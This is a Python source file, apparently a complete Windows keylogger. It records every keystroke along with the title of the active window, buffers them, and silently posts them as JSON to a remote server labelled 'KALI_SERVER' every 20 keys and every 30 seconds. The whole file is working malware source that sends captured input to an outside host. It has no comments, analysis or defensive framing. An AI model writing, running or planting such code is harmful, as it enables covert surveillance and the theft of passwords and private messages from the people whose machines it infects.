

import requests
import json
import time
import win32gui # type: ignore
from pynput import keyboard
import os


KALI_SERVER = 'http://192.168.100.14:5000/log'
LOG_FILE = os.environ['TEMP'] + '\\debug.log'
BUFFER_SIZE = 20


def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown Window"

key_buffer = []

def send_logs():
    if key_buffer:
        try:
            requests.post(KALI_SERVER,json={"window":get_active_window(),"keys":"".join(key_buffer)},timeout=5)
            key_buffer.clear()
        except:
            pass


def on_press(key):
    try:
        key_buffer.append(key.char)
    except AttributeError:
        special_keys = {
            keyboard.Key.space:" ",
            keyboard.Key.enter:"\n[ENTER]\n",
            keyboard.Key.tab:"[TAB]",
            keyboard.Key.backspace:"[BACKSPACE]",
            keyboard.Key.ctrl_l:"[CTRL]",
            keyboard.Key.ctrl_r:"[CTRL]",
            keyboard.Key.shift:"[SHIFT]"
        }
        key_buffer.append(special_keys.get(key,f"[{key}]"))

    if len(key_buffer) >= BUFFER_SIZE:
        send_logs()
    

with keyboard.Listener(on_press=on_press) as listener:
    while True:
        time.sleep(30)
        send_logs()

